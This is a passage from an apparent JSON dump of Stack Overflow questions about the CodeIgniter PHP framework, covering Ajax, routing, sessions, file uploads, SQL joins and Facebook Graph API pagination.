alert('Load was performed.');\n            }\n        });\n</code></pre>\n\n<p>This successfully returns the code I want:</p>\n\n<pre><code>    &lt;script type=\"text/javascript\" src=\"http://maps.google.com/maps/api/js?sensor=false\"&gt;&lt;/script&gt;\n        &lt;script type=\"text/javascript\"&gt;\n        //&lt;![CDATA[\n\n        var map; // Global declaration of the map\n        var iw = new google.maps.InfoWindow(); // Global declaration of the infowindow\n        var lat_longs = new Array();\n        var markers = new Array();\n        function initialize() {\n\n             var myLatlng = new google.maps.LatLng(37.4419, -122.1419);\n            var myOptions = {\n                zoom: 13,\n                center: myLatlng,\n                mapTypeId: google.maps.MapTypeId.ROADMAP}\n            map = new google.maps.Map(document.getElementById(\"map_canvas\"), myOptions);\n\n\n        }\n\n\n    function createMarker(markerOptions) {\n        var marker = new google.maps.Marker(markerOptions);\n        markers.push(marker);\n        lat_longs.push(marker.getPosition());\n        return marker;\n    }\n\n        window.onload = initialize;\n\n        //]]&gt;\n&lt;/script&gt;\n</code></pre>\n\n<p>My question is, in place of the alert I currently have on the succsufull callback, how can I place this javascript in the body (or head) of the HTML document so that the Google map is displayed? (Note: I will also have another ajax call to return the required html).</p>\n\n<p>The reason I'm not just doing it straight with JS calling the GMaps API is that I need to do some processing on the server to get the appropriate markers from the database to put on the map etc. I am using <a href=\"http://biostall.com/codeigniter-google-maps-v3-api-library\" rel=\"nofollow\">this</a> library on the server side to generate the js/html needed to display the map.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13151353,"title":"CodeIgniter php script is not running more than 2 minutes??","body":"<p>I have a PHP script in my Code Igniter application,\nits run on server and fetch some data but its not running more than 2 minutes approx..\nand when I run this without using code igniter its works properly..what may be the reason behind this?</p>\n"},{"tags":["mvc","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13168174,"title":"MVC - Codeigniter - View talking to the model","body":"<p>In most of the posts I've seen on StackOverflow surrounding the MVC architecture, people have said that the model should only be communicated with from the controller, and not from the view.</p>\n\n<p>I'm a little confused about this, because when you Google MVC:\n-<a href=\"http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller</a>\n-<a href=\"http://i.msdn.microsoft.com/dynimg/IC108622.gif\" rel=\"nofollow\">http://i.msdn.microsoft.com/dynimg/IC108622.gif</a>\nthe graphics seem to indicate that there is communication from the view directly to the model.</p>\n\n<p>The specific application I'm wondering about this for is an Ajax/jQuery hierarchical select box like the one here <a href=\"http://kotowicz.net/jquery-option-tree/demo/demo.html\" rel=\"nofollow\">http://kotowicz.net/jquery-option-tree/demo/demo.html</a>. After each selection I was thinking of getting the next box's data from the model. I'm using the Codeigniter framework.</p>\n\n<p>Just after some expertise around the best practice here.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":13169458,"title":"is there a way to make second segment not to look for a function?","body":"<p>What i mean is right now my website is set up to redirect to controller name home</p>\n\n<p>so basically when i type www.domain.com/home or www.domain.com i will end up in home controller.</p>\n\n<p>Now in that controller // page i am loading some tables from database - that data will require pagination from time to time. which mean the link of the pagination is :\nwww.domain.com/home/3/ </p>\n\n<p>Now the way i have it set up when this address is being accessed CI goes to home controller and look for function name 3.</p>\n\n<p>my question is:</p>\n\n<p>is there a way to make it so CI will treat the 3 as a variable instead of a functions.\nAlso is there a way to do it just for that section of the website (i am asking this because i have my whole admin panel set up already with the normal \"www.domain.com/admin/function/variable\" )</p>\n\n<p>Thanks in advanced for any help.</p>\n"},{"tags":["php","javascript","codeigniter","jquery-ajax"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":99,"score":-1,"question_id":13117704,"title":"Ajax update in CodeIgniter","body":"<p>I'm pretty new to the MVC model of CodeIgniter and I cannot say that I'm very experienced when dealing with JavaScript and Ajax functionality either. My question is, how would you structure and change my code below?</p>\n\n<p>I have got it working, clicking a row in a table will result in an Ajax request to the database. The data gathered is then appended after the clicked row.</p>\n\n<p>In my controller I have this function:</p>\n\n<pre><code>public function ajax() {\n    if (func_get_arg(0) == 'get_movies_in_box_set') {\n        header('Content-Type: application/json', true);\n        echo json_encode($this-&gt;movie_library_model-&gt;get_movies_in_box_set(func_get_arg(1)));\n    }\n}\n</code></pre>\n\n<p>And in my model:</p>\n\n<pre><code>public function get_movies_in_box_set($movie_item_id) {\n    $this-&gt;db\n        -&gt;select('movies.title as title')\n        -&gt;from('movies')\n        -&gt;join('movie_item_contents', 'movies.id = movie_item_contents.movie_id')\n        -&gt;where('movie_item_contents.movie_item_id', $movie_item_id);\n    $query = $this-&gt;db-&gt;get();\n    return $query-&gt;result_array();\n}\n</code></pre>\n\n<p>And my horrific-looking view:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n\n$(function() {\n    $('table &gt; tbody &gt; tr')\n        .on('click', function() {\n            var $row = $(this);\n            var id = $row.data('id');\n\n            $.getJSON('movie_library/ajax/get_movies_in_box_set/' + id, function(data) {\n                for (var i = 0; i &lt; data.length; i++) {\n                    $row.after('&lt;tr&gt;&lt;td&gt;' + data[i].title + '&lt;/td&gt;&lt;/tr&gt;');\n                }\n            });\n        });\n});\n\n&lt;/script&gt;\n&lt;table class=\"table table-condensed table-striped\"&gt;\n    &lt;thead&gt;\n        &lt;tr&gt;\n            &lt;th&gt;Title:&lt;/th&gt;\n        &lt;/tr&gt;\n    &lt;/thead&gt;\n    &lt;tbody&gt;\n        &lt;?php foreach ($list as $item) : ?&gt;\n            &lt;tr data-id=\"&lt;?php echo $item['id']; ?&gt;\"&gt;\n                &lt;td&gt;&lt;?php echo $item['title']; ?&gt;&lt;/td&gt;\n            &lt;/tr&gt;\n        &lt;?php endforeach; ?&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n</code></pre>\n\n<p><strong>Edit.</strong> What is the best way to write the controller functionality? I can think of three ways.</p>\n\n<ol>\n<li>Have a special argument in my <code>view()</code> function, but if the function needs other arguments this could turn out problematic.</li>\n<li>Have a function <code>ajax()</code> in the controller which handles all the controller's Ajax functionality. I did this in my example above.</li>\n<li>Write a separate Ajax controller, doing all Ajax for the entire website.</li>\n</ol>\n"},{"tags":["css","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13152874,"title":"Active css menu tabs","body":"<p>I've been reading from this link <a href=\"http://stackoverflow.com/questions/6511558/active-menu-tabs-with-codeigniter\">Active menu tabs with codeigniter</a>, and it works but how about if the link like this <code>domain.com/mycontroller/myfunction/id</code></p>\n\n<p>for example <code>menu A</code> -> <code>domanin.com/A/a/1</code>, <code>menu A</code> -> <code>domanin.com/A/b/1</code>, etc. The highlight active class is on the 'A' controller.</p>\n\n<p>thank you</p>\n\n<p><strong>edited</strong></p>\n\n<p>below is my template view code</p>\n\n<pre><code> &lt;?php foreach ($menu as $row): ?&gt;\n &lt;li &lt;?php if($this-&gt;uri-&gt;uri_string(2) == url_title($row-&gt;menu,'/detail_product/',TRUE)):?&gt;class=\"active\"&lt;?php endif;?&gt;&gt;&lt;?php echo anchor('/'.$row-&gt;link,$row-&gt;menu); ?&gt;&lt;/li&gt;\n &lt;?php endforeach; ?&gt;  \n</code></pre>\n\n<p>here my controller code</p>\n\n<pre><code>public function index()\n{\n    $data['content'] = 'home/garagebox';\n    $data['menu'] = $this-&gt;auction_model-&gt;load_menu();\n\n    $this-&gt;load-&gt;view('template',$data);\n}\n</code></pre>\n\n<p>my menu look like this,</p>\n\n<p>Home | Auction | News</p>\n\n<p>and I have product when I choose one it will direct to this link <code>http://domain.com/index.php/auction/detail_product/1</code> because this link it's under Auction menu so on Auction menu it's should be highlight </p>\n"},{"tags":["codeigniter","file-upload","filepath","remote-server"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13169225,"title":"file path invlalid when using Codeigniter Upload class on hostgator server","body":"<p>I am using codeigniter 2.1.2 upload class to upload a file to a remote server on hostgator. I got a following error when trying to upload a file.</p>\n\n<p><code>\n<em>The upload path does not appear to be valid.</em>\n</code></p>\n\n<p>Here is my folder structure:</p>\n\n<p>my-addon-domain/</p>\n\n<p>----<strong>import</strong>(target folder)</p>\n\n<p>----application/</p>\n\n<p>--------controller/</p>\n\n<p>------------upload_controller.php</p>\n\n<p>in my controller, I have tried set different path to $config['upload_path'] including </p>\n\n<ol>\n<li>/home/my-hostgator-username/public_html/my-addon-domain-folder/import/'</li>\n<li>../import/</li>\n<li>my-site-url/import/</li>\n</ol>\n\n<p>None of these work. I am sure to set writeable permission to folder \"import\".</p>\n\n<p>Many thanks  </p>\n"},{"tags":["javascript","codeigniter","ssl","https","assets"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13168908,"title":"Insecure Content Warning for content served over http from Javascript File on Codeigniter Site","body":"<p>Google Chrome is returning an insecure content warning for content served on some of my pages. The content is called by a Javascript file in the assets/js directory in Codeigniter.\nThe Javascript file is loaded in the footer by reference to the js_asset_url, set out in the asset_helper file.</p>\n\n<pre><code>&lt;script src=\"&lt;?php echo js_asset_url('script.js'); ?&gt;\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>I only use SSL on specific controllers, hence the assets folder content is currently loaded insecurely and worries users due to the warning displayed. Does anyone have a solution for Codeigniter to force assets such as .js files to load via SSL?</p>\n\n<p>EDIT:\nI finally fixed using an external reference source (hope it's ok to post the link!)\n<a href=\"http://www.davidnard.com/2011/04/easy-ssl-redirection-in-codeigniter/\" rel=\"nofollow\">http://www.davidnard.com/2011/04/easy-ssl-redirection-in-codeigniter/</a>\nThe content being called by the .js file was for 2 functions within a controller. Setting the relevant controller in the $partial array (see above link) did the trick.</p>\n"},{"tags":["php","codeigniter","laravel","framework-migration"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":107,"score":2,"question_id":13167726,"title":"Moving a php project to codeigniter or updating the existing framework","body":"<p>I'm trying to figure out the best way to handle a php project going forward. It was built a few years ago on a custom framework - the framework wasnt strict MVC...it simply had controllers and views, and libraries.</p>\n\n<p>I've since added in additional functionality and it's starting to feel very much like a complete mess, with old code and new code mixed up, and no decent database management. </p>\n\n<p>I'm struggling to decide what my best option is. On the one hand, I could keep patching the existing codebase in the hope that I can make it somewhat more usable and futureproof, or move to codeigniter (note: I say codeigniter as I've got a fair amount of experience with it). </p>\n\n<p>The Codeigniter option would obviously mean I'd have to go through everything, and there will no doubt be a fair amount of recoding, however in the long term it may be worth it.</p>\n\n<p>There was another option I was considering, and that was the Laravel framework. I have no direct experience with it, however I hear that Laravel 4 (not released yet) is supposed to be excellent.</p>\n\n<p>So, putting those three options on the table, which would you pick and why? I'm looking for a compelling reason to choose one over the other, as quite frankly I dont have a clue which route I'm best taking at the moment!</p>\n"},{"tags":["mysql","sql","codeigniter","join","entity-attribute-value"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13167697,"title":"mysql simplifying select query from EAV with multiple joins (codeigniter)?","body":"<p>The current code does not return all rows. </p>\n\n<p>For example if some products don't have category or user activity are excluded from selected rows.</p>\n\n<p>How to simplify that query with working one?</p>\n\n<p>Is there a way to do it with multiple unions or any other (simple) way?</p>\n\n<pre><code>$q = $this-&gt;db-&gt;select('products.id, users_activity.timestamp AS added, products_content.lang, products_content.product_name, products_content.price, products_categories_content.category_name AS category, products_categories_content.category_id AS category_id')\n        -&gt;from('products')\n        -&gt;join('products_content', 'products.id = products_content.product_id')\n        -&gt;join('products_and_categories', 'products.id = products_and_categories.product_id')\n        -&gt;join('products_categories_content', 'products_categories_content.category_id = products_and_categories.category_id')\n        -&gt;join('users_activity', 'users_activity.id = products.id AND users_activity.lang = products_content.lang')-&gt;where('users_activity.type', 'product')\n        -&gt;group_by(array('products.id', 'products_content.lang', 'users_activity.id'))\n        -&gt;limit($limit, $offset)\n        -&gt;order_by($sort_by, $sort_order);\n\nif (strlen($query_array['lang']) &amp;&amp; ! is_numeric($query_array['lang'])) { $q-&gt;like('lang', $query_array['lang']); }\nif (strlen($query_array['product_name'])) { $q-&gt;like('product_name', $query_array['product_name']); }\nif (strlen($query_array['category'])) { $q-&gt;where('category_id', $query_array['category']); }\n\n$return['rows'] = $q-&gt;get()-&gt;result();\n</code></pre>\n"},{"tags":["php","codeigniter","doctrine","doctrine2","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":12845378,"title":"Service Layer in Codeigniter 2 with Doctrine 2","body":"<p>hope some of you can give me a hand with this.</p>\n\n<p>Im working in a project using Codeigniter 2 and Doctrine 2, everything is working ok but I have some \"sanity\" issues i would like to fix.</p>\n\n<p>The main problem I have right now is with persisting the entities.\nIn a normal MVC the persistance should be in the Model, but now that I only have Entities and Repositories and i dont have the so called \"Models\", I'm putting all of this code in the controller making them huge and intimidating :(</p>\n\n<p>I've read on some places that the best approach for this is to have a \"Service\" layer between the Controller and the Entities, but I haven't found a good way to do this in Codeigniter due to is hard classic MVC pattern.</p>\n\n<p>So im asking for some advice in how to aproach this.\nAny of you guys is having the same problems?</p>\n"},{"tags":["php","codeigniter","unlink"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":13161090,"title":"php unlink() showing success but not deleting file","body":"<p>I'm trying to delete selected images on the server using Codeigniter. Here is the code in my controller:</p>\n\n<pre><code>$photos = $this-&gt;input-&gt;post('photograph');\n\nforeach ($photos as $photo) {\n            echo 'photo: '.$photo.'&lt;br /&gt;';\n            if (unlink('./uploads/'.$photo)) {;\n                echo 'success!';\n            }\n            else {\n                echo \"error deleting file.\";\n            }\n        }\n</code></pre>\n\n<p>Here is what's happening:</p>\n\n<ul>\n<li>I'll select a file in the form, click delete, and I get the \"success!\" message from the controller.</li>\n<li>However, when I check the server, the image is still there.</li>\n<li>If I select the same file <em>again</em>, click delete, I get the error message, along with the PHP error message:</li>\n</ul>\n\n<p>unlink(./uploads/path/to/file) [function.unlink]: No such file or directory.</p>\n\n<p>Can anyone tell me what's going on here? My understanding was that unlink() is <em>supposed</em> to delete files, but that doesn't appear to be happening here.</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":13165710,"title":"Session duplicate entry","body":"<p>I get the following issue</p>\n\n<p><img src=\"http://i.stack.imgur.com/Lna4h.jpg\" alt=\"error\"></p>\n\n<p>I can't seem to really duplicate the error because it happens randomly.\nBut i think this happens when i use chrome and internet explorer to view the website.\nIn my database it sometimes then updates all the session records with the new 'last_activity'</p>\n\n<p>Searched the web and github for similar problems but did not find anything.</p>\n\n<p>I am using the develop branch</p>\n"},{"tags":["php","jquery","codeigniter","image-processing","base64"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":13163402,"title":"Codeigniter | Save Base64 image to file","body":"<p>I have created a custom product configurator that saves a canvas element as a base64 encoded image. When I echo the image in the browser as the image src it works fine.</p>\n\n<p>So something like this works:</p>\n\n<pre><code>$base64Image = $_POST['dataUrl'];\necho '&lt;img src=\"'.$base64Image.'\" /&gt;';\n</code></pre>\n\n<p>My problem is that codeigniter wont add this base64 image src to the session, probably because its too big. I have tried some methods that people have used to write an image to the server and they all throw errors. Does anyone know how I can write this base64 string to an image on the server like 'myimage.png' in the images/custom folder?</p>\n\n<p>Any help is appreciated.</p>\n"},{"tags":["php","codeigniter","codeigniter-routing"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13157811,"title":"routes.php and controllers (codeigniter)","body":"<p>I have two controllers \n 1- site \n 2- management</p>\n\n<p>the first controllers(Site) is work successfuly \nthe second controllers(Managemnt) is not work.</p>\n\n<p>I don't know what is the errror</p>\n\n<p>I change the routes.php but still doesn't work(managment)</p>\n\n<pre><code>$route['default_controller'] = \"site\";\n$route['(:any)'] = \"site/$1\";\n$route['Administration'] = \"Administration/index\";\n$route['Administration/([a-z])'] = 'Administration/$1';\n</code></pre>\n\n<p>this links work:</p>\n\n<blockquote>\n  <p>example.com/hotel/12312</p>\n  \n  <p>example.com/contact</p>\n  \n  <p>example.com/city/newyork </p>\n  \n  <p>example.com/Administration</p>\n</blockquote>\n\n<p>but this links doesn't works:</p>\n\n<blockquote>\n  <p>example.com/Administration/hotels</p>\n  \n  <p>example.com/Administration/add_new</p>\n  \n  <p>example.com/Administration/cities</p>\n</blockquote>\n\n<p>where is the problem pls because I tired to solve this problem</p>\n\n<p>thaks</p>\n"},{"tags":["codeigniter","session-timeout"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2331,"score":1,"question_id":7005808,"title":"Set Session Expiration Time Manually-CodeIgniter","body":"<p>How can i set session expiration time manually in codeigniter. My case is like this, if user whose login has role as admin, the expiration time is longer. And if role of user whose login is not admin, session expiration time is about minutes.</p>\n\n<p>Thanks.,</p>\n"},{"tags":["php","codeigniter","csv"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13160793,"title":"exporting mysql query column headings","body":"<p>I have the following query...</p>\n\n<pre><code>    public function get_invoice_user_summary_csv($invoice_table_id)\n    {\n    $sql_get_user_summ = \"\n                            SELECT `billingHistory`.`$invoice_table_id`.userId as userId, ipCore.users.firstname, ipCore.users.surname, COUNT(`billingHistory`.`$invoice_table_id`.id) AS totalNum, SUM(`billingHistory`.`$invoice_table_id`.durationSeconds) AS totalDuration, (SUM(`billingHistory`.`$invoice_table_id`.priceMin)+SUM(`billingHistory`.`$invoice_table_id`.priceCon)) AS totalCost\n                            FROM `billingHistory`.`$invoice_table_id`\n                            LEFT JOIN ipCore.users ON `billingHistory`.`$invoice_table_id`.userId = ipCore.users.id\n                            GROUP BY userId\n                            ORDER BY ipCore.users.surname ASC, ipCore.users.firstname ASC;\";\n\n    $query = $this-&gt;db_mtvm-&gt;query($sql_get_user_summ);\n    if($query-&gt;num_rows() &gt; 0)\n        {\n        foreach ($query-&gt;result_array() as $row)\n            {\n            $line = '';\n            $value = '';\n            foreach($row as $value)\n                {\n                if((!isset($value)) || ($value == \"\"))\n                    {\n                    $value = \",\";\n                    }\n                else\n                    {\n                    $value = str_replace( '\"' , '\"\"' , $value );\n                    $value = '\"' . $value . '\"' . \",\";\n                    }\n                $line .= $value;\n                }\n            print substr(str_replace(\"\\r\", \"\", trim($line)), 0, -1).\"\\r\\n\";\n            flush();\n            ob_flush();\n            }\n        }\n    else return false;\n    }\n</code></pre>\n\n<p>this return formatted array for csv out put in a different controller.</p>\n\n<p>however it is just the body of data (as i expected). However I have read a few questions with i think similar things, but canot quite work out in this example where I need to put the column headings. either manually entered, or I will assign these from the sql query.</p>\n"},{"tags":["codeigniter","pyrocms"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13161041,"title":"Pyrocms Files core module return value after upload","body":"<p>Like my question states, I wonder what the return value is, from the documentation I am made to understand that everything returned is either an array populated with values or a boolean, meaning its false and failed (Boohoo!!!). Well I am developing a module for a client and I wanted to add entries to a database based on the success from a file upload in my own modules database tables. But in the documentation all I see is: </p>\n\n<pre><code>&lt;?php array('status' =&gt; true, 'message' =&gt; 'A message string in the current language', 'data' =&gt; $any_available_data);?&gt;\n</code></pre>\n\n<p>so $any_available_data is an array but can anyone give me an idea of what it would consist of? I looked at the CI documentation on the fileupload library and see that there is an array that is returned so is that array all the data that the files module in pyrocms returns as well? </p>\n"},{"tags":["codeigniter","doctrine","doctrine2","doctrine-odm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13142938,"title":"Doctrine undefined function apc_fetch","body":"<p>I'm using <a href=\"http://www.joelverhagen.com/blog/2011/05/setting-up-codeigniter-2-with-doctrine-2-the-right-way/\" rel=\"nofollow\">this tutorial</a>, which gives a detail explanation about how to set up CodeIgniter and Doctrine. I'm using CodeIgniter 2.1.0 and Doctrine 2.2.1, but I get this error:</p>\n\n<blockquote>\n  <p>Fatal error: Call to undefined function <code>Doctrine\\Common\\Cache\\apc_fetch()</code> in /Applications/XAMPP/xamppfiles/htdocs/emma_watson_shrine/application/libraries/Doctrine/Common/Cache/ApcCache.php on line 52 </p>\n</blockquote>\n\n<p>Can you help me out?</p>\n"},{"tags":["mysql","codeigniter","join","left-join","duplicate-data"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":13086174,"title":"Duplicate entries from database","body":"<p><strong>ON closer inspection the problem is solved if I remove the comment table join, but obviously this isn't ideal help appreciated!!</strong></p>\n\n<p>I'm trying to write a blog with Codeigniter. At the moment i'm displaying all the information that I want to display, but for some reason, when viewing the blog, I've got duplicate content for the categories. There are only 3 test categories in my database but 1 of my test posts that has all 3 selected is showing six and the other is showing just the one category twice.</p>\n\n<p>Even stranger than that, the first blog post is also counting the wrong number of comments. It's displaying 6 when there are only 4 in the database and only two are related to that post, but the strangest of all is that the second post displays the correct number of comments, two. How can that be.</p>\n\n<p>This is the query from the model in question.</p>\n\n<pre><code>$this-&gt;db-&gt;select('posts.id,\n                        posts.title,\n                        posts.slug,\n                        posts.content,\n                        posts.author,\n                        posts.date,\n                        posts.time,\n                        posts.tags,\n                        posts.status,\n                        GROUP_CONCAT(categories.name SEPARATOR \\'-\\') AS categories,\n                        count(comments.id) as total_comments\n                        ');\n    $this-&gt;db-&gt;group_by(array('posts.id'));\n    $this-&gt;db-&gt;join('posts_categories', 'posts_categories.blog_entry_id = posts.id', 'left outer', 'left outer');\n    $this-&gt;db-&gt;join('categories', 'posts_categories.blog_category_id = categories.category_id', 'left outer');\n    $this-&gt;db-&gt;join('comments', 'comments.post_id = posts.id', 'left outer' );\n\n    $query = $this-&gt;db-&gt;get('posts', $config['per_page'], $this-&gt;uri-&gt;segment(3));\n</code></pre>\n\n<p>The standard query generated is this:</p>\n\n<pre><code>SELECT DISTINCT `posts`.`id`, \n`posts`.`title`, `posts`.`slug`, \n`posts`.`content`, `posts`.`author`, \n`posts`.`date`, `posts`.`time`, \n`posts`.`tags`, `posts`.`status`, \n GROUP_CONCAT(categories.name SEPARATOR '-') AS categories, \n count(comments.id) as total_comments \n FROM (`posts`) \n LEFT OUTER JOIN `posts_categories` ON `posts_categories`.`blog_entry_id` = `posts`.`id` \n LEFT JOIN `categories` ON `posts_categories`.`blog_category_id` = `categories`.`category_id` \n LEFT JOIN `comments` ON `comments`.`post_id` = `posts`.`id` \n GROUP BY `posts`.`id` LIMIT 1\n</code></pre>\n\n<p>The database dump can be found <a href=\"http://jonigale.com/sql-dump.txt\" rel=\"nofollow\">here</a></p>\n\n<p>Any help would be greatly appreciated, this is making me crazy!</p>\n\n<p>Cheers.</p>\n"},{"tags":["database","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13157932,"title":"CodeIgniter classifieds I need DB sketch","body":"<p>I can't image how to create classifieds structure.\nExample I have page for cars ads, and there can be fields year, price, and more.\nAnd I have page for mobile phones where can be fields price, color, display size and so on. For another page can be another fields and I need add them dinamicly, it can bee select field, text input, or maybe checkbox.</p>\n\n<p>So how I can add new fields for filtering ads, where to keep form validation rules?</p>\n\n<p>Can someone please give me a sketch of db that can me explain all this process?</p>\n"},{"tags":["javascript","jquery","ajax","json","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13159842,"title":"jQuery dialog form submit to CodeIgniter form validation","body":"<p>I'm ajax post'ing form data from a jquery dialog modal to my CodeIgniter controller which performs its form validation. Everything works fine when using FireFox.  When using IE10, the form does not seem to submit to the controller. I found suggestions saying to add \"contentType: 'application/json; charset=utf-8' to my jquery .ajax - this seems to allow IE10 to start submitting the form, however CI form validation no longer seems to work for either browser. Remarking the contentType out (as per below) allows FireFox to work again.</p>\n\n<p>Any suggestions?</p>\n\n<p>Here's my javascript:</p>\n\n<pre><code>var dataObj = {type_id: tt_tid, rtype_id: tt_rtid, ref_id: tt_rid, time: tt_time, date: tt_date };\n\n$.ajax({\n    data: dataObj,\n    cache:false,\n    //contentType: \"application/json; charset=utf-8\",\n    dataType: \"json\",\n    type: \"POST\",\n    url: '&lt;?php echo base_url();?&gt;task/tt_ajax_add',\n    success: function(data) {\n        //Clear the message\n        $(\"#modal_message\").html('').removeClass().css({'display' : 'none'});\n\n        if (data.success == true) {\n            $(\"#modal_message\").html(data.message).css({'display' : 'block'}); \n            clearForm('#m_timetrack_form');\n        }else{\n            $(\"#modal_message\").html(data.message).addClass('error').css({'display' : 'block'}); \n        }\n    }\n});\n</code></pre>\n\n<p>Here's my CI controller method</p>\n\n<pre><code>function tt_ajax_add()\n{\n    if ($this-&gt;input-&gt;is_ajax_request()){\n        $this-&gt;load-&gt;library('form_validation');\n        $validate_config = \"timetrack_add\";\n\n        //Check if the form is valid\n        if ($this-&gt;form_validation-&gt;run($validate_config) == FALSE ){\n            $result['success'] = FALSE;\n            $result['message'] = \"Please correct any errors below.\";\n            $result['message'] .= validation_errors();\n            //$result['message'] .= file_get_contents('php://input');\n\n        #Form data was valid\n        }else{\n            $result['success'] = TRUE;\n            $result['message'] = \"Submitted successfully.\";\n\n        }\n        exit(json_encode($result));\n    }\n    exit();\n}\n</code></pre>\n"},{"tags":["php","codeigniter","amazon-web-services"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13158697,"title":"AWS amazon SES stopped working suddenly","body":"<p>I am not able to send the mail from aws.amazon SES since from Monday (30-10-2012) previously it is working fine suddenly it stopped working. I got following is the errors</p>\n\n<pre><code>A PHP Error was encountered\n\nSeverity: User Warning\n\nMessage: SimpleEmailService::getSendQuota(): Sender - RequestExpired: Request timestamp: Wed, 31 Oct 2012 11:50:32 UTC expired. It must be within 300 secs/ of server time. Request Id: e472fb5a-2351-11e2-8183-8138c6c456cf\n\nFilename: libraries/ses.php\n\nLine Number: 363\n</code></pre>\n\n<p>But this same code working with fine in another server What is the issue Please help,I could not find solution for this. </p>\n"},{"tags":["codeigniter","cart"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13156793,"title":"codeigniter cart: display cart for multiple store","body":"<p>The idea is that I'm going to build a website that process purchases to some different stores registered in my website using CodeIgniter. The challenge is coming when I want to display the content of cart only the item from the shop currently viewed by the buyer. I came across to using the cart's options index for passing the store id so that I can use it to identify from which store the item from.</p>\n\n<p>But I'm not sure how to do it because I don't know how to select certain cart content based on an identifier like store id. Can anyone give an idea about it? Thank you at advance.</p>\n"},{"tags":["php","codeigniter","image-resizing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":13154787,"title":"image resize before uploading in CodeIgniter PHP","body":"<p>I am having the following block of code in my function:</p>\n\n<pre><code>$target_path = \"uploads/\";\n\n        $target_path = $target_path . basename( $_FILES['image']['name']);\n\n        if(move_uploaded_file($_FILES['image']['tmp_name'], $target_path))\n       {\n             echo  \"The file \".  basename( $_FILES['image']['name']).\" has been uploaded\";           \n       }      \n       else   \n       {\n            echo \"There was an error uploading the file, please try again!\";\n       }\n</code></pre>\n\n<p>Now I want to resize the image before uploading. I am using the CodeIgniter framework. I have this code:</p>\n\n<pre><code>$config['upload_path'] = \"uploads/\";\n\n\n $path=$config['upload_path'];\n\n        $config['overwrite'] = FALSE;\n        $config['remove_spaces'] = TRUE;\n        $config['allowed_types'] = 'gif|jpg|jpeg|png|JPEG|JPG|PNG';\n        $config['max_size'] = '1024';\n        $config['maintain_ratio'] = TRUE;\n        $config['max_width'] = '1000';\n        $config['max_height'] = '1000';\n        $this-&gt;load-&gt;library('upload',$config);\n</code></pre>\n\n<p>But this isn't working properly. I am looking for a good solution where image is uploaded by my specified height and width.</p>\n"},{"tags":["jquery","json","codeigniter","facebook-graph-api"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13157670,"title":"Pagination for Graph API using AJAX","body":"<p>I am currently using code igniter, fb graph api, json and jquery to fetch a list of the users friends which works fine, but I am wondering which is the most efficient way of paginating the results.</p>\n\n<p>My current code looks like...</p>\n\n<p>Controller:</p>\n\n<pre><code>public function get_friends_list() {\n\n    header('Content-type: application/json');\n\n    $friends = $this-&gt;facebook-&gt;api(\n       '/me/friends',\n       'GET',\n       array(\n          'access_token' =&gt; $this-&gt;session-&gt;userdata('access_token'),\n          'fields' =&gt; 'installed,name,username'\n       )\n    );\n\n    die(json_encode($friends));\n}\n</code></pre>\n\n<p>jQuery:</p>\n\n<pre><code>/* Triggers */\nif($('#friendlist').length) {\n    loadFriends(1);\n};\n\n$('a#loadmore.friends').click(function() {\n   var afterID = $('#friendlist .friend').last().attr('id');\n   alert(afterID);\n\n   loadFriends(￼);\n});\n\n/* Load in friends list */\nfunction loadFriends(offset) {\n$('#loading').empty().show();\n\nvar msg = $('&lt;span&gt;Loading&lt;/span&gt;&lt;img src=\"/img/loader.gif\" /&gt;');\nvar setOffset = offset;\n\n$(\"#loading\").append(msg);\n\n$('#listarea').stop().fadeTo(\"fast\", 